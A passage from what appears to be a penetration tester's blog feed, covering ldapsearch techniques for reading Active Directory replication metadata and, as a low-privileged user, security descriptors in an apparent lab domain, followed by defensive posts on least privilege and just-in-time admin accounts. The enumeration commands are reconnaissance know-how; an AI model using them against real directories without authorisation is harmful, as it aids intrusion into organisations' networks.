&lt;li&gt;&lt;code&gt;| perl -MMIME::Base64 -n -00 -e &#39;s/\n +//g;s/(?&amp;lt;=:: )(\S+)/decode_base64($1)/eg;print&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Basically you are pipeing the output of &lt;code&gt;ldapsearch&lt;/code&gt; into a bit of perl that Base64 decodes anything that looks like Base64.&lt;/p&gt;
&lt;p&gt;Back on track, there is a ton of great info in Replication metadata but the blog post from SpecterOps above.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.10 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -x -w ASDqwe123 -D sittingduck&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; msDS-ReplAttributeMetaData                       &lt;span style=&#34;color:#75715e&#34;&gt;# extended LDIF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# LDAPv3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# base &amp;lt;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;gt; with scope subtree&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# requesting: msDS-ReplAttributeMetaData&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Administrator, Users, sittingduck.info&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrator,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5tc0RTLVN1cHBvcnRlZEVuY3J5cHRpb25UeXBlczwvcHN6QXR0cmlidXRlTmFtZT4KCTxkd1ZlcnNpb24+MTwvZHdWZXJzaW9uPgoJPGZ0aW1lTGFzdE9y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aWdpbmF0aW5nQ2hhbmdlPjIwMTUtMTAtMTRUMDM6Mjg6MTRaPC9mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZT4KCTx1dWlkTGFzdE9yaWdpbmF0aW5nRHNhSW52b2NhdGlvbklEPjhkMmExZjVjLTU4ZDQtNGVmYS1iY2QyLWY3ZDg1ZWY1MzAxMzwvdXVpZExhc3RPcmlna
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;W5hdGluZ0RzYUludm9jYXRpb25JRD4KCTx1c25PcmlnaW5hdGluZ0NoYW5nZT4xMjc3NjwvdXNuT3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXNuTG9jYWxDaGFuZ2U+MTI3NzY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaW
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dpbmF0aW5nRHNhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5sYXN0TG9nb25UaW1lc3RhbXA8L3BzekF0dHJpYnV0ZU5hbWU+Cgk8ZHdWZXJzaW9uPjI8L2R3VmVyc2lvbj4KCTxmdGltZUxhc3RPcmlnaW5hdGluZ0No
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;YW5nZT4yMDE3LTA2LTIwVDAwOjE3OjIyWjwvZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXVpZExhc3RPcmlnaW5hdGluZ0RzYUludm9jYXRpb25JRD4yOWJkZWQ4MS0xMGRmLTQ0YTMtOGVkNi0xOWY1ODJjYjhiNGU8L3V1aWRMYXN0T3JpZ2luYXRpbmdEc2FJb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nZvY2F0aW9uSUQ+Cgk8dXNuT3JpZ2luYXRpbmdDaGFuZ2U+MzQzOTQ2PC91c25PcmlnaW5hdGluZ0NoYW5nZT4KCTx1c25Mb2NhbENoYW5nZT4zNDM5NDY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaWdpbmF0aW5nRH
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the Perl trick:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.10 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -x -w ASDqwe123 -D sittingduck&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; msDS-ReplAttributeMetaData | perl -MMIME::Base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-n -00 -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/\n +//g;s/(?&amp;lt;=:: )(\S+)/decode_base64($1)/eg;print&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# extended LDIF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# LDAPv3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# base &amp;lt;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;gt; with scope subtree&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# requesting: msDS-ReplAttributeMetaData&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Administrator, Users, sittingduck.info&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrator,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: &amp;lt;DS_REPL_ATTR_META_DATA&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszAttributeName&amp;gt;msDS-SupportedEncryptionTypes&amp;lt;/pszAttributeName&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;dwVersion&amp;gt;1&amp;lt;/dwVersion&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;ftimeLastOriginatingChange&amp;gt;2015-10-14T03:28:14Z&amp;lt;/ftimeLastOriginatingChange&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;uuidLastOriginatingDsaInvocationID&amp;gt;8d2a1f5c-58d4-4efa-bcd2-f7d85ef53013&amp;lt;/uuidLastOriginatingDsaInvocationID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnOriginatingChange&amp;gt;12776&amp;lt;/usnOriginatingChange&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnLocalChange&amp;gt;12776&amp;lt;/usnLocalChange&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszLastOriginatingDsaDN&amp;gt;&amp;lt;/pszLastOriginatingDsaDN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/DS_REPL_ATTR_META_DATA&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: &amp;lt;DS_REPL_ATTR_META_DATA&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszAttributeName&amp;gt;lastLogonTimestamp&amp;lt;/pszAttributeName&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;dwVersion&amp;gt;2&amp;lt;/dwVersion&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;ftimeLastOriginatingChange&amp;gt;2017-06-20T00:17:22Z&amp;lt;/ftimeLastOriginatingChange&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;uuidLastOriginatingDsaInvocationID&amp;gt;29bded81-10df-44a3-8ed6-19f582cb8b4e&amp;lt;/uuidLastOriginatingDsaInvocationID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnOriginatingChange&amp;gt;343946&amp;lt;/usnOriginatingChange&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnLocalChange&amp;gt;343946&amp;lt;/usnLocalChange&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszLastOriginatingDsaDN&amp;gt;&amp;lt;/pszLastOriginatingDsaDN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/DS_REPL_ATTR_META_DATA&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ntsecuritydescriptor&#34;&gt;NTSecurityDescriptor&lt;/h3&gt;
&lt;p&gt;While I personally don&amp;rsquo;t recall ever running into an instance where I wasn&amp;rsquo;t able to read the security descriptor via ldapsearch, it&amp;rsquo;s just because I&amp;rsquo;ve only went after very specific objects and not that it never happens. Lee Christensen (&lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;@tifkin_&lt;/a&gt;) figured out a way to read security descriptors as low privileged users. Honestly I don&amp;rsquo;t know how it works, but here it is:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/tifkin_/status/1372628611677753344&#34;&gt;https://twitter.com/tifkin_/status/1372628611677753344&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv&amp;rsquo;ed user? Add the following argument:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;-E &#39;!1.2.840.113556.1.4.801=::MAMCAQc=&#39;&lt;/code&gt;&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv&amp;#39;ed user? Add the following argument: &lt;br&gt;&lt;br&gt;-E &amp;#39;!1.2.840.113556.1.4.801=::MAMCAQc=&amp;#39; &lt;a href=&#34;https://t.co/vMi7RPsYPB&#34;&gt;pic.twitter.com/vMi7RPsYPB&lt;/a&gt;&lt;/p&gt;&amp;mdash; Lee Christensen (@tifkin_) &lt;a href=&#34;https://twitter.com/tifkin_/status/1372628611677753344?ref_src=twsrc%5Etfw&#34;&gt;March 18, 2021&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;h3 id=&#34;ad-password-dumping-via-ldap&#34;&gt;AD Password Dumping via LDAP&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;src: &lt;a href=&#34;https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap&#34;&gt;https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;src: &lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2&#34;&gt;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Every so often I forget it&amp;rsquo;s &lt;strong&gt;not possible&lt;/strong&gt; to sync passwords from the &lt;code&gt;unicodePwd&lt;/code&gt; attribute. I&amp;rsquo;m saving this here mostly so I don&amp;rsquo;t waste my time trying again.&lt;/p&gt;
&lt;p&gt;From MSDN:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The unicodePwd attribute is never returned by an LDAP search.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;p&gt;For futher info, the &lt;a href=&#34;https://ldapwiki.com/wiki/&#34;&gt;LDAP Wiki&lt;/a&gt; is an amazing resource.&lt;/p&gt;
&lt;h3 id=&#34;ropnops-talk-at-troopers-2019&#34;&gt;Ropnop&amp;rsquo;s Talk at Troopers 2019&lt;/h3&gt;
&lt;p&gt;You should absolutely check out &lt;a href=&#34;https://twitter.com/ropnop&#34;&gt;Ropnop&lt;/a&gt; (and follow him on Twitter) if you want to learn more.&lt;/p&gt;
&lt;script async class=&#34;speakerdeck-embed&#34; data-id=&#34;af116568615748f79ab794a862d2ef1d&#34; data-ratio=&#34;1.77777777777778&#34; src=&#34;//speakerdeck.com/assets/embed.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Beautiful Basics: Lesson 2</title>
      <link>https://malicious.link/post/2022/beautiful-basics-lesson-02/</link>
      <pubDate>Sun, 08 May 2022 02:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/beautiful-basics-lesson-02/</guid>
      <description>
&lt;h3 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-01&#34;&gt;Lesson 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-02&#34;&gt;Lesson 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-03&#34;&gt;Lesson 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-04&#34;&gt;Lesson 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-05&#34;&gt;Lesson 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-06&#34;&gt;Lesson 6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-07&#34;&gt;Lesson 7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-08&#34;&gt;Lesson 8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-09&#34;&gt;Lesson 9&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-10&#34;&gt;Lesson 10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-11&#34;&gt;Lesson 11&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&#34;lesson-2---least-privilege&#34;&gt;Lesson 2 - Least Privilege&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;No one&lt;/strong&gt; should have administrative access. All elevated access should be &lt;strong&gt;checked out&lt;/strong&gt; when you need it and checked back in (automatically if possible). Just like UAC. MFA should be required, proximity or push based. And every use of a break glass account should be highly monitored&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/beautifulbasics_lesson2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I think &amp;ldquo;Least Privilege&amp;rdquo; has been harped on at least &amp;hellip; you know what, let me wager that you can&amp;rsquo;t find a single infosec or hacking conference from 2000 until now (2022) that doesn&amp;rsquo;t have 4 talks with the words &amp;ldquo;least privilege&amp;rdquo; in the talk. But maybe a handful out of all of those talks tell you how to accomplish such a feat.&lt;/p&gt;
&lt;h3 id=&#34;the-goal&#34;&gt;The Goal&lt;/h3&gt;
&lt;p&gt;Lets talk about the goal first though, just-in-time administration. Identity and Access Management (IAM) has tried very hard to steal the &amp;ldquo;Just-In-Time&amp;rdquo; (JIT) terminology from the software development and reverse engineering world but I don&amp;rsquo;t think it has ever stuck. I do however completely agree with it&amp;rsquo;s concepts. JIT Privilege Access Management (JIT PAM, try to say that acronym in a meeting, probably won&amp;rsquo;t end well), is the concept where you get rid of all of the administrative accounts across your entire organization, replacing them with temporary (you only have access to the account for a short amount of time) and even sometimes transitory (the admin account gets deleted after use) administrative accounts. That&amp;rsquo;s the goal, where if you business closes down at 8 PM on a Friday, by 9 PM (for example), there isn&amp;rsquo;t a single administrative account left on your company network.&lt;/p&gt;
&lt;h3 id=&#34;why-is-this-needed&#34;&gt;Why is this needed?&lt;/h3&gt;
&lt;p&gt;Right now, in the organization that you work in, can an IT admin use their own administrative account to make a change to your systems or network? Of course, that&amp;rsquo;s their job. We definitely don&amp;rsquo;t want to hinder them from doing their job right?&lt;/p&gt;
&lt;p&gt;Here are the problems that this scenario faces:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The password for administrative accounts should be much more secure but many times it&amp;rsquo;s not, since it&amp;rsquo;s up to a human to select. They also have to type it in a large number of times a day so we don&amp;rsquo;t want to make it difficult to do so.&lt;/li&gt;
&lt;li&gt;The time an administrative user&amp;rsquo;s password is valid for can be weeks, months, years.&lt;/li&gt;
&lt;li&gt;An administrative user can forget or simply not know the correct way to log out of sessions with administrative access (this is super common both on web applications and RDP)&lt;/li&gt;
&lt;li&gt;Very rarely have I seen a network completely devoid of &amp;ldquo;old&amp;rdquo; or &amp;ldquo;forgotten&amp;rdquo; administrative users. This could be a lack of off-boarding process or just laziness but it&amp;rsquo;s pretty universal.&lt;/li&gt;
&lt;li&gt;Where does the administrator write down which systems they are going to access or which actions they are going to perform?&lt;/li&gt;
&lt;li&gt;Admins leave all kinds of scripts and saved passwords lying around on systems they only access for short periods of time. We all do this, if we didn&amp;rsquo;t then kiosks in hotels wouldn&amp;rsquo;t need to be wiped between use&amp;hellip; oh yea, they aren&amp;rsquo;t&amp;hellip; you get the point.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I can use a vaulting product to take care of #1, #2, and possibly help with #4. I can use Active Directory GPOs to work on #2 and #3 possibly. But there is still no accountability around what actions are being performed or on what systems.&lt;/p&gt;
&lt;h3 id=&#34;how-do-we-get-there&#34;&gt;How do we get there?&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Start with pairing down and auditing the list of administrators. Starting with Domain Admins is easy. Narrow it down to just the people who actually truly need that much access.&lt;/li&gt;
&lt;li&gt;Now make a generic Domain Admin accounts instead of the personalized ones and vault them. It&amp;rsquo;s ok if the admins each still use just one of those accounts. This is getting them used to the idea that these aren&amp;rsquo;t &amp;ldquo;their&amp;rdquo; accounts and they can&amp;rsquo;t just leave stuff on the desktop or saved passwords.&lt;/li&gt;
&lt;li&gt;Make MFA required to check out these generic accounts.&lt;/li&gt;
&lt;li&gt;Enable &amp;ldquo;reason&amp;rdquo; fields in your vaulting software (like Hashicorp Vault, CyberArk or Thycotic) and push those logs to your SEIM / logging platform (or better yet, into and admins chat channel that the IR team has access to as well)&lt;/li&gt;
&lt;li&gt;Make all profile customization (files on desktops, custom terminal sessions, etc) get deleted once the account is checked back in. (this will require roaming profiles or a way to manage it remotely)&lt;/li&gt;
&lt;li&gt;Now start doing that for each and every administrative group / accounts, cloud, network infrastructure, virtualization platforms, databases, etc.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Eventually you&amp;rsquo;ll get to a place where it&amp;rsquo;s normal for people to check out accounts and have it log why they are doing so, then &lt;strong&gt;everything access privilege that account has is revoked&lt;/strong&gt; and the password is automatically rotated and randomized. You can even get to the point where they have to specify the servers they need to access and it only gives them access to just those servers.&lt;/p&gt;

&lt;h4 id=&#34;slides&#34;&gt;Slides&lt;/h4&gt;
&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vQWsIcPGnJ60ROVu3K32uI7Gtg7zciUle7hfZnN5HPrJ1mD38LZWT5x5DQOyd5CpLXt0hL125fKqOQL/embed?start=false&amp;loop=true&amp;delayms=15000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
&lt;h4 id=&#34;video&#34;&gt;Video&lt;/h4&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/9yv6SdDtU-Q&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;



</description>
    </item>
    
    <item>
      <title>Beautiful Basics: Lesson 1</title>
      <link>https://malicious.link/post/2022/beautiful-basics-lesson-01/</link>
      <pubDate>Sat, 07 May 2022 01:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/beautiful-basics-lesson-01/</guid>
      <description>
&lt;h3 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-01&#34;&gt;Lesson 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-02&#34;&gt;Lesson 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-03&#34;&gt;Lesson 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-04&#34;&gt;Lesson 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-05&#34;&gt;Lesson 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-06&#34;&gt;Lesson 6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-07&#34;&gt;Lesson 7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-08&#34;&gt;Lesson 8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-09&#34;&gt;Lesson 9&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-10&#34;&gt;Lesson 10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-11&#34;&gt;Lesson 11&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&#34;lesson-1---you-could-be-legacy&#34;&gt;Lesson 1 - YOU could be &amp;ldquo;Legacy&amp;rdquo;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Stop thinking that just because it did or didn’t work X way when you learned it, it still does or doesn&amp;rsquo;t. That could be 20 years ago. Technology changes faster than you do.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/beautifulbasics_lesson1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I guess that&amp;rsquo;s a bit mean for a title but here&amp;rsquo;s the thing:&lt;/p&gt;
